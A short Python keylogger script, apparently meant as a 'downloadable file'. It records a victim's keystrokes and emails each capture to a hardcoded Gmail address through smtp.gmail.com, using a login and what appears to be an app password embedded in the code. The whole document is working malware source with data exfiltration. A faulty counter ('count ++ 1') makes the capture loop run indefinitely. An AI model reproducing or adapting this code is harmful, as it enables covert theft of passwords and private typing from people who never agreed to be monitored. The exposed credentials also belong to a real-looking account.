#1. Downloadable file
#2. Log Keys  yes
#3. send email with log when finished  yes


import keyboard
import time
import smtplib
from tkinter import *

a = ''

def logger():
    global a
    a = keyboard.record('enter')

def send():
    # email stuff
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login('danxxsorenson49@gmail.com', 'pxlmwrmjqrpynaue')
    server.sendmail("danxxsorenson49@gmail.com", 'danxxsorenson49@gmail.com', c)
    server.quit()


count = 0
while count <3:
    logger()
    b = list(keyboard.get_typed_strings(a))
    c = b[0]

    send()
    b = []
    count ++ 1








